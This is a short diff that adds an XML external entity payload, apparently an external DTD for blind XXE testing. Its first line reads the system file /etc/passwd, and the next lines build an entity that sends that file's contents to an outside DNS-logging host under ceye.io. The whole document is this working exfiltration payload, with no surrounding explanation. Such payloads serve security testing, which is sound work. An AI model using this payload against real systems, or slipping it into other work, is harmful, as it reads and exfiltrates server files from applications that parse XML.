@@ -1,0 +1,3 @@
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % all "<!ENTITY bbb SYSTEM 'http://%file;x.vqhx27.ceye.io'>">
+%all;
